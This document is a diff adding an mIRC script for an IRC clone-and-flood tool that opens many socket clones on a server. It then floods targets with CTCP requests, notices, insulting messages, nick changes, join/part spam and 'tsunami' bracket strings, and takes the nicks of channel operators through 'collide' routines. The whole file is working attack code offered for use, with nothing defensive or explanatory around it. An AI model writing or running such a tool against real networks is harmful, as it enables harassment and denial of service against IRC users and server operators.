@@ -1,0 +1,150 @@
+startclones {
+  sockclose raw*
+  window -e  @Sock-clones 120 150 560 250 $mircdirsock-popups.txt
+  window @clones
+  aline @Sock-clones 14*** %ss Loading $1 clones on $2 $+ : $+ $3 $+  %ss ***
+  if ($4 == -b) { set %bogus 0,0 }
+  if ($4 != -b) { unset %bogus }
+  if ($4 == $null) { unset %bogus }
+  unset %rawopened
+  unset %raw
+  unset %clones
+  unset %nnick
+  unset %data
+  :makeclones
+  if (%raw == $1) { halt }
+  inc %raw
+  sockopen raw $+ %raw $2 $3
+  goto makeclones
+} 
+addclones {
+  aline @Sock-clones 14*** %ss Loading $1 additional clones on $2 $+ : $+ $3 $+  %ss ***
+  if ($4 == -b) { set %bogus 0,0 }
+  if ($4 != -b) { unset %bogus }
+  if ($4 == $null) { unset %bogus }
+  unset %count
+  :makeclones
+  if (%count == $1) { halt }
+  inc %raw
+  inc %count
+  sockopen raw $+ %raw $2 $3
+  goto makeclones
+} 
+killclones {
+  aline @Sock-clones 14*** %ss Killing clones %ss ***
+  sockwrite -n raw* quit : $+ %ss  Sh[o]ck %version $+ +mIRC's sockets  %ss
+  unset %raw
+}
+joinall {
+  if ($1 == $null) { echo -a * %ss 2JOINALL USAGE: /joinall <chan> <key> | halt } 
+  aline @Sock-clones %ss All clones joining $1
+  sockwrite  -n raw* join $1 $2
+}
+partall {
+  if ($1 == $null) { echo -a * %ss 2PARTALL USAGE: /partall <chan> <part msg> | halt } 
+  aline @Sock-clones %ss All clones parting $$1
+  if ($2 == $null) { set %pcmsg :2 $+ %ss Sh[o]ck %version $+ %ss }
+  else { set %pcmsg : $+ %ss $2 %ss }
+  sockwrite -n raw* part $$1 %pcmsg
+}
+nickflood {
+  if ($1 == $null) { set %nnflood 3 }
+  else { set %nnflood $1 }
+  if ($2 == $null) { set %nflooddel 1 }
+  else { set %nflooddel $2 }
+  aline @Sock-clones %ss 12Starting 2NICK FLOOD12 $$1 2changes every12 $$2 2seconds   
+  .timer333 %nnflood %nflooddel nflood
+}
+nflood { 
+  unset %nchnick
+  :changes
+  inc %nchnick
+  set %rawsocket raw $+ %nchnick
+  if ($sock(%rawsocket).status == $null) { goto changes }
+  sockwrite -n raw $+ %nchnick nick $r(A,Z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ ` $+ $r(1,9)
+  if (%nchnick >= %rawopened) { halt }
+  goto changes
+}
+jpboom {
+  aline @Sock-clones %ss 12Starting jOiN/PaRt b00m2 on12 $1 
+  sockwrite -n raw* join $1 
+  sockwrite -n raw* part $1 :2 $+ %ss jOiN/PaRt b00m %ss
+  sockwrite -n raw* join $1 
+  sockwrite -n raw* part $1 :2 $+ %ss jOiN/PaRt b00m %ss
+  sockwrite -n raw* join $1 
+  sockwrite -n raw* part $1 :2 $+ %ss jOiN/PaRt b00m %ss
+  sockwrite -n raw* join $1 
+}
+vflood {
+  aline @sock-clones %ss 2Starting 12VERSION FLOOD2 on12 $$1 2:12 $$2 2versions every12 $$3 2seconds    
+  .timer334 $$2 $$3 sockwrite -n raw* privmsg $$1 :VERSION 
+}
+uflood {
+  aline @sock-clones %ss 2Starting 12USERINFO FLOOD2 on12 $$1 2:12 $$2 2userinfo every12 $$3 2seconds    
+  .timer335 $$2 $$3 sockwrite -n raw* privmsg $$1 :USERINFO 
+}
+cflood {
+  aline @sock-clones %ss 2Starting 12CLIENTINFO FLOOD2 on12 $$1 2:12 $$2 2clientinfo every12 $$3 2seconds    
+  .timer336 $$2 $$3 sockwrite -n raw* privmsg $$1 :CLIENTINFO 
+}
+pflood {
+  aline @sock-clones %ss 2Starting 12PING FLOOD2 on12 $$1 2:12 $$2 2pings every12 $$3 2seconds    
+  .timer337 $$2 $$3 sockwrite -n raw* privmsg $$1 :PING 
+}
+tflood {
+  aline @sock-clones %ss 2Starting 12TIME FLOOD2 on12 $$1 2:12 $$2 2times every12 $$3 2seconds    
+  .timer338 $$2 $$3 sockwrite -n raw* privmsg $$1 :TIME 
+}
+ttflood {
+  aline @sock-clones %ss 2Starting 12TROUT FLOOD2 on12 $$1 2:12 $$2 2trouts every12 $$3 2seconds    
+  .timer339 $$2 $$3 sockwrite -n raw* privmsg $$1 :TIME 
+}
+eggflood {
+  aline @sock-clones %ss 2Starting 12EGGDROP FLOOD2 on12 $$1 2:12 $$2 2helps every12 $$3 2seconds    
+  .timer340 $$2 $$3 sockwrite -n raw* privmsg $$1 :HELP
+}
+mflood {
+  aline @sock-clones %ss 2Starting 12MSG FLOOD2 on12 $$1 2:12 $$2 2msgs every12 $$3 2seconds    
+  .timer341 $$2 1 sockwrite -n raw* privmsg $$1 :Ohhhh my god a fucking lamah (cazzo)
+}
+notflood {
+  aline @sock-clones %ss 2Starting 12NOTICE FLOOD2 on12 $$1 2:12 $$2 2notices every12 $$3 2seconds    
+  .timer342 $$2 1 sockwrite -n raw* notice $$1 :Ohhhh my god a fucking lamah!!
+}
+seenflood {
+  aline @sock-clones %ss 2Starting 12SEEN FLOOD2 on12 $$1 2:12 $$2 2!seen every12 $$3 2seconds     
+  .timer343 $$2 1 sockwrite -n raw* privmsg $$1 :!seen a fucking lamah as ya
+}
+tsunami {
+  aline @sock-clones %ss 2Starting a 12TSUNAMI FLOOD2 on12 $$1
+  {
+    .timer23 3 4 sockwrite -n raw* privmsg $$1 : $+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]] 
+    .timer24 3 6 sockwrite -n raw* notice $$1 : $+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]] 
+    .timer25 3 2 sockwrite -n raw* privmsg $$1 : $+ ]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]] 
+  }
+}
+clonecmd {
+  aline @sock-clones %ss 2Starting a 12SOCKET CLONES COMMAND2 $1-
+  sockwrite -n raw* $$1-
+}
+collide {
+  if ( $1 == $null ) {   echo -a * 2 $+ %ss 2COLLIDE CLONES usage /collide [<channel>|<nick(s)>] }
+  else if ( %raw == $null ) {   echo -a * 2 $+ %ss 2COLLIDE CLONES please load clones and try again }
+  else if ( $chr(35) isin $1 ) && ( $chan($1) != $1 ) { echo -a * 2 $+ %ss 2COLLIDE CLONES you are not on channel $1 }
+  else if ( $chr(35) isin $1 ) && ( $chan($1) == $1 ) { .aline @sock-clones 2 $+ %ss 2COLLIDE CLONES preparing collide clones: $opnick($1,0) ops on channel $1 with %raw clones
+    set %countcollide 0
+    :collidechan
+    inc %countcollide 1
+    if ( %countcollide > $opnick($1,0) ) || ( %countcollide > %raw ) { unset %countcollide | halt }
+    .sockwrite -n raw $+ %countcollide nick $opnick($1,%countcollide)
+    goto collidechan
+  }
+  else { .aline @sock-clones 2 $+ %ss 2COLLIDE CLONES preparing collide clones: $gettok($1-,0,32 ) nicks with %raw clones
+    set %countcollide 0
+    :collidenicks
+    inc %countcollide 1
+    if ( %countcollide > $gettok($1-,0,32 ) ) || ( %countcollide > %raw ) { unset %countcollide | halt }
+    .sockwrite -n raw $+ %countcollide nick $gettok($1-,%countcollide,32)
+    goto collidenicks
+  }
+}
